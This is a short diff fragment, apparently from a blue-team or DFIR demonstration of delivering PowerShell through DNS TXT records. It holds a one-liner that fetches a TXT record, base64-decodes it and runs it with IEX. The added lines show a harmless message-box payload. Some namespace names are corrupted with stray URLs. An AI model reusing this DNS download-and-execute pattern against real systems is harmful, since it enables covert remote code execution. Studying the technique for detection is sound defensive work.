@@ -33,3 +33,8 @@ CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);’
 
 $b64=(IEX(nslookup -q=txt http://test.dfir.com.au  2>$null)[-1]);[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))| IEX}
 
+
+
+% dig txt dfir.<redacted>.<tld> +short
+[System.Reflection.Assembly]::LoadWithPartialName('http://System.Windows.Forms'); [http://System.Windows.Forms.MessageBox]::Show('DFIR FTW!','BlueTeam <3')
+
